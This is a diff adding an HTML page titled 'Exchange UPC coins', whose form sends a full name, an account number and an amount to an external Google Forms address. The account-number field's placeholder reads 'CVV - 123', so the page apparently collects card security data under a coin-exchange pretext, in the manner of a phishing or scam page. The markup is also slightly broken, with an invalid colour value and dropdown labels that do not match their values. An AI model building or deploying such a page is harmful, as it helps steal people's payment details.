@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exchange Request</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+          background-image: url('bg.jpg');
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            background-color: #f9f9g9;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            margin-top: 50px;
+          border-radius:15px;
+        }
+        h1 {
+            text-align: center;
+        }
+        form {
+          
+          width:100%;
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select {
+          
+          border-radius:25px;
+            margin-bottom: 15px;
+            padding: 10px;
+            font-size: 16px;
+        }
+        button {
+          margin-left: 25%;
+            padding: 10px;
+            font-size: 16px;
+          width:50%;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Exchange UPC coins</h1>
+        <form action="https://docs.google.com/forms/d/e/1FAIpQLSedkS_JYThm1uooI80ePMa_aC3pFc01wiOAMHQBXQU9AbIhLw/formResponse" method="POST" target="_blank">
+            <label for="fullName">Full Name</label>
+            <input type="text" id="fullName" name="entry.699423111" placeholder="Account name" required>
+
+            <label for="accountNumber">Account number</label>
+            <input type="text" id="accountNumber" name="entry.1377421924" placeholder="CVV - 123" required>
+
+            <label for="withdrawalAmount">UPC Amount</label>
+            <input type="number" id="withdrawalAmount" name="entry.897109982" placeholder="100$"required>
+
+            <label for="packageType">Package Type</label>
+            <select id="packageType" name="entry.1714853230" required>
+                <option value="Standard">Premium</option>
+                <option value="Premium">VIP</option>
+                <option value="VIP">Prime</option>
+            </select>
+
+            <button type="submit">Submit Request</button>
+        </form>
+    </div>
+</body>
+</html>
